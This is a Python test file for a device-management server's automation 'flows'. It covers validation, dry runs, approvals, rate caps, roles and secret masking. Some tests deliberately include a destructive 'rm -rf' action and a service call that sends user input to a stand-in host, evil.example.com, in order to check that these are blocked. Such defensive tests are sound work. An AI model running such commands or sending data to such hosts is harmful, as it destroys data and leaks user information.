"""Flows: validation, deterministic execution, dry runs, triggers and safety limits."""
import pytest
from fastapi.testclient import TestClient

from server import flows
from server.main import create_app

HEALTHY = {"cpu_pct": 20, "mem_pct": 50, "disk_pct": 60, "crashes_24h": 0, "uptime_hours": 10,
           "network_latency_ms": 40}


@pytest.fixture
def client(tmp_path):
    return TestClient(create_app(str(tmp_path / "f.db"), enroll_token="tok", ai_enabled=False, it_tokens=""))


def enroll(c, name="lt-1", kind="laptop"):
    r = c.post("/api/enroll", json={"token": "tok", "hostname": name, "kind": kind, "platform": "windows",
                                    "location": "Bangalore"}).json()
    return {"X-Device-Key": r["key"]}, r["device_id"]


def graph(*nodes, edges=()):
    return {"nodes": list(nodes), "edges": [{"from": a, "port": p, "to": b} for a, p, b in edges]}


DISK_FLOW = graph(
    {"id": "s", "type": "start"},
    {"id": "c", "type": "condition", "config": {"field": "metrics.disk_pct", "op": "greater_than", "value": "90"}},
    {"id": "a", "type": "action", "config": {"action": "clean_temp"}},
    {"id": "u", "type": "notify_user", "config": {"message": "Cleaning {{device.hostname}}"}},
    {"id": "e", "type": "end"},
    edges=[("s", "out", "c"), ("c", "yes", "a"), ("a", "out", "u"), ("c", "no", "e")])


def test_validation_catches_bad_graphs():
    assert flows.validate(DISK_FLOW, {"type": "manual"}) == []
    bad = graph({"id": "s", "type": "start"}, {"id": "a", "type": "action", "config": {"action": "rm -rf"}},
                edges=[("s", "out", "a"), ("a", "out", "s")])
    errs = " ".join(flows.validate(bad, {"type": "nope"}))
    assert "approved catalogue" in errs and "loops" in errs and "Trigger" in errs
    assert flows.validate(graph({"id": "e", "type": "end"}), {"type": "manual"}) == ["A flow needs exactly one Start node"]


def test_samples_seeded_disabled(client):
    fl = client.get("/api/flows").json()
    assert {f["name"] for f in fl} == {"Teams crash response", "Incident follow-up"}
    assert not any(f["enabled"] for f in fl)
    assert client.get("/api/flows/meta").json()["node_types"]["condition"]["ports"] == ["yes", "no"]


def test_dry_run_has_no_side_effects_then_real_run_queues_action(client):
    h, did = enroll(client)
    client.post("/api/telemetry", json={"metrics": {**HEALTHY, "disk_pct": 50}}, headers=h)
    fid = client.post("/api/flows", json={"name": "Disk", "graph": DISK_FLOW}).json()["id"]
    r = client.post(f"/api/flows/{fid}/run", json={"device_id": did, "dry_run": True}).json()
    assert [s["node"] for s in r["steps"]] == ["s", "c", "e"]           # 50% -> "no" branch
    client.post("/api/telemetry", json={"metrics": {**HEALTHY, "disk_pct": 95}}, headers=h)
    before = len(client.get(f"/api/devices/{did}").json()["actions"])
    r = client.post(f"/api/flows/{fid}/run", json={"device_id": did, "dry_run": True}).json()
    assert [s["node"] for s in r["steps"]] == ["s", "c", "a", "u"] and "Would queue" in r["steps"][2]["result"]
    assert len(client.get(f"/api/devices/{did}").json()["actions"]) == before
    r = client.post(f"/api/flows/{fid}/run", json={"device_id": did, "dry_run": False}).json()
    assert r["status"] == "completed" and "queued" in r["steps"][2]["result"]
    assert len(client.get(f"/api/devices/{did}").json()["actions"]) == before + 1
    assert client.get(f"/api/flows/{fid}/runs").json()[0]["steps"][3]["result"] == "Sent"


def test_medium_risk_action_still_needs_approval_and_mobile_cannot_run_scripts(client):
    _, did = enroll(client)
    _, mob = enroll(client, "ph-1", "mobile")
    g = graph({"id": "s", "type": "start"}, {"id": "a", "type": "action",
                                              "config": {"action": "repair_app", "target": "Teams"}},
              edges=[("s", "out", "a")])
    fid = client.post("/api/flows", json={"name": "Repair", "graph": g}).json()["id"]
    client.post(f"/api/flows/{fid}/run", json={"device_id": did, "dry_run": False})
    assert client.get("/api/approvals").json()[0]["action"] == "repair_app"
    r = client.post(f"/api/flows/{fid}/run", json={"device_id": mob, "dry_run": False}).json()
    assert r["status"] == "failed" and "can't run scripted actions" in r["steps"][1]["result"]


def test_issue_trigger_runs_enabled_flow_and_respects_rate_cap(client):
    h, _ = enroll(client)
    g = graph({"id": "s", "type": "start"}, {"id": "n", "type": "notify_it",
                                              "config": {"message": "{{issue.title}} on {{device.hostname}}"}},
              edges=[("s", "out", "n")])
    fid = client.post("/api/flows", json={"name": "Tell IT", "graph": g, "enabled": True, "max_runs_per_hour": 1,
                                          "trigger": {"type": "issue_opened", "match": "high_cpu"}}).json()["id"]
    client.post("/api/telemetry", json={"metrics": {**HEALTHY, "cpu_pct": 97}}, headers=h)
    runs = client.get(f"/api/flows/{fid}/runs").json()
    assert len(runs) == 1 and runs[0]["trigger"] == "issue_opened" and "lt-1" in runs[0]["steps"][1]["result"] + \
        str(client.get("/api/events").json())
    client.post("/api/telemetry", json={"metrics": HEALTHY}, headers=h)                   # resolve
    client.post("/api/telemetry", json={"metrics": {**HEALTHY, "cpu_pct": 97}}, headers=h)  # re-open
    assert len(client.get(f"/api/flows/{fid}/runs").json()) == 1                          # capped


def test_enabling_invalid_flow_rejected_and_service_api_needs_allowlist(client, monkeypatch):
    bad = graph({"id": "e", "type": "end"})
    assert client.post("/api/flows", json={"name": "x", "graph": bad, "enabled": True}).status_code == 400
    g = graph({"id": "s", "type": "start"},
              {"id": "api", "type": "service_api", "config": {"url": "https://evil.example.com/x?u={{input.user}}"}},
              edges=[("s", "out", "api")])
    fid = client.post("/api/flows", json={"name": "api", "graph": g}).json()["id"]
    r = client.post(f"/api/flows/{fid}/run", json={"dry_run": False, "input": {"user": "a"}}).json()
    assert r["status"] == "failed" and "not in DWIP_FLOW_ALLOWED_HOSTS" in r["steps"][1]["result"]
    monkeypatch.setenv("DWIP_FLOW_ALLOWED_HOSTS", "evil.example.com")
    r = client.post(f"/api/flows/{fid}/run", json={"dry_run": True, "input": {"user": "a"}}).json()
    assert r["status"] == "completed" and r["steps"][1]["result"] == "Would call GET https://evil.example.com/x?u=a"


def test_secrets_never_rendered_into_logs():
    assert flows.render("Basic {{secret.SNOW}}", {}) == "Basic ••••"


def test_viewer_cannot_edit_or_run_flows(tmp_path):
    c = TestClient(create_app(str(tmp_path / "r.db"), enroll_token="tok", ai_enabled=False,
                              it_tokens="v:viewer,e:engineer"))
    assert c.get("/api/flows", headers={"X-DWIP-Token": "v"}).status_code == 200
    assert c.post("/api/flows/1/run", json={}, headers={"X-DWIP-Token": "v"}).status_code == 403
    assert c.post("/api/flows/2/run", json={"input": {"incident_number": ""}},
                  headers={"X-DWIP-Token": "e"}).json()["steps"][-1]["result"] == "No incident"
